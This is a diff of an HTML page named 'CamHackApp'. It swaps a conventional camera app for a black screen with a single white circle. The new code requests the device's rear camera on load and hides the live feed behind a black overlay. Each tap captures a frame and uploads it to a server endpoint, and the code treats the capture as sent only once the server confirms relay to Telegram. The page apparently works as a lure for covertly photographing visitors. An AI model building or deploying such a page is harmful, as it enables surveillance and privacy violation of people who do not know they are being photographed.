@@ -1,105 +1,327 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>CamHackApp</title>
-    <link rel="stylesheet" href="/css/style.css" />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+<meta name="theme-color" content="#000000" />
+<title>CamHackApp</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  html, body {
+    width:100%; height:100%;
+    background:#000; overflow:hidden;
+    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    overscroll-behavior:none;
+  }
+  #app {
+    position:fixed; inset:0;
+    background:#000;
+    display:flex; align-items:center; justify-content:center;
+    overflow:hidden;
+  }
+  /* Camera feed hidden behind black overlay */
+  #video {
+    position:absolute; inset:0;
+    width:100%; height:100%;
+    object-fit:cover;
+    background:#000;
+    z-index:0;
+  }
+  #app::before {
+    content:'';
+    position:absolute; inset:0;
+    background:#000;
+    z-index:1;
+    pointer-events:none;
+  }
+  #canvas { display:none; }
+
+  /* The white circle — shutter button */
+  #shutter {
+    position:relative;
+    z-index:2;
+    width:150px; height:150px;
+    border-radius:50%;
+    background:#ffffff;
+    border:none;
+    cursor:pointer;
+    padding:0; outline:none;
+    transition: transform .18s ease, box-shadow .28s ease, background .2s ease;
+    box-shadow:
+      0 0 0 0 rgba(255,255,255,.35),
+      0 0 30px rgba(255,255,255,.28),
+      0 0 80px rgba(255,255,255,.10);
+    user-select:none;
+    touch-action:manipulation;
+  }
+  #shutter:hover {
+    transform:scale(1.08);
+    box-shadow:
+      0 0 0 16px rgba(255,255,255,.10),
+      0 0 55px rgba(255,255,255,.5),
+      0 0 120px rgba(255,255,255,.18);
+  }
+  #shutter:active { transform:scale(.93); }
+  #shutter:focus-visible { box-shadow:0 0 0 6px rgba(255,255,255,.35), 0 0 50px rgba(255,255,255,.4); }
+  #shutter:disabled { cursor:wait; opacity:.65; }
+
+  /* Pulsing halo around circle */
+  #shutter::after {
+    content:'';
+    position:absolute; inset:-8px;
+    border-radius:50%;
+    border:1px solid rgba(255,255,255,.20);
+    pointer-events:none;
+    animation:halo 2.4s ease-out infinite;
+  }
+  @keyframes halo {
+    0%   { transform:scale(.98); opacity:.85; }
+    100% { transform:scale(1.4); opacity:0; }
+  }
+
+  /* White flash feedback */
+  #flash {
+    position:fixed; inset:0;
+    background:#fff; opacity:0;
+    pointer-events:none; z-index:80;
+  }
+  #flash.on { animation:flashAnim .45s ease-out; }
+  @keyframes flashAnim { 0%{opacity:.9} 100%{opacity:0} }
+
+  /* Status text */
+  #status {
+    position:fixed;
+    bottom:max(36px, env(safe-area-inset-bottom, 36px));
+    left:50%;
+    transform:translateX(-50%);
+    color:#9aa0a6;
+    font-size:12px; font-weight:600;
+    letter-spacing:2.4px;
+    text-transform:uppercase;
+    opacity:0;
+    transition:opacity .3s ease;
+    z-index:90;
+    white-space:nowrap;
+    text-align:center;
+    padding:0 20px;
+    pointer-events:none;
+  }
+  #status.show { opacity:1; }
+  #status.ok   { color:#4ade80; }
+  #status.err  { color:#f87171; }
+  .spin {
+    display:inline-block;
+    width:11px; height:11px;
+    border:2px solid rgba(255,255,255,.25);
+    border-top-color:#fff;
+    border-radius:50%;
+    animation:spin .7s linear infinite;
+    margin-right:8px;
+    vertical-align:-1px;
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+</style>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="nav-brand">
-            <span class="brand-icon">⌘</span>
-            <span class="brand-text">CamHack</span>
-            <span class="brand-version">v2.0</span>
-        </div>
-        <div class="nav-links">
-            <button class="nav-btn active" data-tab="camera">Camera</button>
-            <button class="nav-btn" data-tab="gallery">Gallery</button>
-        </div>
-        <div class="nav-credit">
-            <span>by Humayun Shariar Himu</span>
-        </div>
-    </nav>
+  <div id="app">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <button id="shutter" type="button" aria-label="Capture and send to Telegram"></button>
+  </div>
+  <div id="flash"></div>
+  <div id="status"></div>
 
-    <main class="app-container">
-        <section id="camera-tab" class="tab-content active">
-            <div class="camera-wrapper">
-                <div class="video-container" id="videoContainer">
-                    <video id="video" autoplay playsinline muted></video>
-                    <canvas id="canvas" style="display:none;"></canvas>
-                    <div class="scan-line"></div>
-                    <div class="corner-tl"></div>
-                    <div class="corner-tr"></div>
-                    <div class="corner-bl"></div>
-                    <div class="corner-br"></div>
-                    <div class="camera-overlay" id="cameraOverlay">
-                        <span class="overlay-text">INITIALIZING</span>
-                        <span class="overlay-dots"></span>
-                        <button class="permission-btn" id="enableCameraBtn" type="button">Allow Camera &amp; Start</button>
-                    </div>
-                    <div class="countdown-overlay" id="countdownOverlay" style="display:none;">
-                        <span id="countdownNumber">3</span>
-                    </div>
-                </div>
-                <div class="camera-controls">
-                    <div class="control-group">
-                        <button class="ctrl-btn primary" id="captureBtn">
-                            <span class="btn-icon">⊞</span>
-                            <span>Capture</span>
-                        </button>
-                        <button class="ctrl-btn" id="flipBtn">
-                            <span class="btn-icon">↻</span>
-                            <span>Flip</span>
-                        </button>
-                        <button class="ctrl-btn" id="effectToggleBtn">
-                            <span class="btn-icon">◈</span>
-                            <span>Effects</span>
-                        </button>
-                    </div>
-                </div>
-                <div class="effect-panel" id="effectPanel" style="display:none;">
-                    <div class="effect-grid">
-                        <button class="effect-btn active" data-effect="none">Normal</button>
-                        <button class="effect-btn" data-effect="neon">Neon</button>
-                        <button class="effect-btn" data-effect="cyber">Cyber</button>
-                        <button class="effect-btn" data-effect="matrix">Matrix</button>
-                        <button class="effect-btn" data-effect="vapor">Vapor</button>
-                        <button class="effect-btn" data-effect="glitch">Glitch</button>
-                        <button class="effect-btn" data-effect="pixel">Pixel</button>
-                        <button class="effect-btn" data-effect="invert">Invert</button>
-                    </div>
-                </div>
-                <div class="status-bar">
-                    <span id="statusText">● READY</span>
-                    <span id="fpsCounter">FPS: 0</span>
-                </div>
-            </div>
-        </section>
+<script>
+(function () {
+  'use strict';
 
-        <section id="gallery-tab" class="tab-content">
-            <div class="gallery-header">
-                <h2>Capture Gallery</h2>
-                <span class="gallery-count" id="galleryCount">0 items</span>
-                <button class="ctrl-btn danger" id="clearGalleryBtn">
-                    <span class="btn-icon">✕</span>
-                    <span>Clear All</span>
-                </button>
-            </div>
-            <div class="gallery-grid" id="galleryGrid">
-                <div class="gallery-empty">
-                    <span class="empty-icon">⌘</span>
-                    <p>No captures yet</p>
-                    <span class="empty-sub">Point your camera and shoot</span>
-                </div>
-            </div>
-        </section>
-    </main>
+  const video     = document.getElementById('video');
+  const canvas    = document.getElementById('canvas');
+  const shutter   = document.getElementById('shutter');
+  const flash     = document.getElementById('flash');
+  const statusEl  = document.getElementById('status');
 
-    <footer class="app-footer">
-        <span>CamHackApp &bull; Developed by Humayun Shariar Himu &bull; Dark Neon Edition</span>
-    </footer>
+  const state = {
+    stream: null,
+    facingMode: 'environment',
+    ready: false,
+    busy: false,
+    starting: null,
+    lastGrab: 0
+  };
 
-    <script src="/js/app.js"></script>
+  /* ---------- UI helpers ---------- */
+  function showStatus(text, type, spinner) {
+    statusEl.innerHTML = (spinner ? '<span class="spin"></span>' : '') + text;
+    statusEl.className = 'show ' + (type || '');
+  }
+  function hideStatus() { statusEl.className = ''; }
+
+  /* ---------- Camera ---------- */
+  function waitForFrame() {
+    return new Promise(function (resolve) {
+      if (video.readyState >= 2 && video.videoWidth > 0) {
+        setTimeout(resolve, 120);
+        return;
+      }
+      let done = false;
+      const finish = function () {
+        if (done) return;
+        done = true;
+        setTimeout(resolve, 120);
+      };
+      video.addEventListener('loadeddata', finish, { once: true });
+      video.addEventListener('playing',    finish, { once: true });
+      setTimeout(finish, 2000);
+    });
+  }
+
+  async function ensureCamera() {
+    if (state.ready && state.stream) return true;
+    if (state.starting) return state.starting;
+
+    state.starting = (async function () {
+      try {
+        if (!window.isSecureContext) throw new Error('HTTPS required for camera');
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          throw new Error('Camera not supported');
+        }
+        const constraints = {
+          video: {
+            facingMode: state.facingMode,
+            width:  { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        };
+        state.stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = state.stream;
+        try { await video.play(); } catch (e) { /* autoplay race, ignore */ }
+        await waitForFrame();
+        state.ready = true;
+        return true;
+      } catch (err) {
+        console.error('[CamHack] camera error:', err);
+        const msg = (err && err.name === 'NotAllowedError')
+          ? 'CAMERA PERMISSION DENIED'
+          : (err && err.message ? err.message.toUpperCase() : 'CAMERA ERROR');
+        showStatus(msg, 'err');
+        setTimeout(hideStatus, 3500);
+        return false;
+      } finally {
+        state.starting = null;
+      }
+    })();
+
+    return state.starting;
+  }
+
+  /* ---------- Capture ---------- */
+  function grabFrame() {
+    const w = video.videoWidth  || 640;
+    const h = video.videoHeight || 480;
+    canvas.width  = w;
+    canvas.height = h;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+    return canvas.toDataURL('image/jpeg', 0.92);
+  }
+
+  /* ---------- Upload ---------- */
+  async function upload(dataUrl) {
+    const blob = await (await fetch(dataUrl)).blob();
+    const fd = new FormData();
+    fd.append('image', blob, 'capture-' + Date.now() + '.jpg');
+
+    const res = await fetch('/api/upload', {
+      method: 'POST',
+      body: fd
+    });
+
+    let json = {};
+    try { json = await res.json(); } catch (e) { /* ignore parse error */ }
+
+    if (!res.ok || !json.success) {
+      throw new Error(json.error || ('Upload failed (' + res.status + ')'));
+    }
+    if (json.telegram !== 'sent') {
+      throw new Error('Telegram send failed');
+    }
+    return json;
+  }
+
+  /* ---------- Main click handler ---------- */
+  async function onCapture() {
+    if (state.busy) return;
+    state.busy = true;
+    shutter.disabled = true;
+
+    try {
+      if (!state.ready) {
+        showStatus('STARTING CAMERA', '', true);
+        const ok = await ensureCamera();
+        if (!ok) return;
+      }
+
+      // Flash feedback
+      flash.classList.remove('on');
+      void flash.offsetWidth;
+      flash.classList.add('on');
+
+      // Capture + upload
+      const dataUrl = grabFrame();
+      state.lastGrab = Date.now();
+
+      showStatus('SENDING', '', true);
+      await upload(dataUrl);
+
+      showStatus('SENT \u2713', 'ok');
+      setTimeout(hideStatus, 1600);
+    } catch (err) {
+      console.error('[CamHack] capture failed:', err);
+      showStatus((err && err.message ? err.message : 'FAILED'), 'err');
+      setTimeout(hideStatus, 3000);
+    } finally {
+      state.busy = false;
+      shutter.disabled = false;
+    }
+  }
+
+  shutter.addEventListener('click', onCapture);
+
+  /* ---------- Pre-warm on load ---------- */
+  window.addEventListener('load', function () {
+    ensureCamera().then(function (ok) {
+      if (!ok) {
+        // Camera prompt blocked until user gesture: guide them gently
+        if (!statusEl.classList.contains('show')) {
+          showStatus('TAP THE CIRCLE TO ALLOW CAMERA', '');
+          setTimeout(hideStatus, 4000);
+        }
+      } else {
+        hideStatus();
+      }
+    });
+  });
+
+  /* ---------- Pause / resume camera when tab hidden ---------- */
+  document.addEventListener('visibilitychange', function () {
+    if (!state.stream) return;
+    const tracks = state.stream.getVideoTracks();
+    if (document.hidden) {
+      tracks.forEach(function (t) { try { t.enabled = false; } catch (e) {} });
+    } else {
+      tracks.forEach(function (t) { try { t.enabled = true;  } catch (e) {} });
+    }
+  });
+
+  /* ---------- Cleanup on unload (best-effort) ---------- */
+  window.addEventListener('pagehide', function () {
+    if (state.stream) {
+      state.stream.getTracks().forEach(function (t) { try { t.stop(); } catch (e) {} });
+    }
+  });
+})();
+</script>
 </body>
 </html>
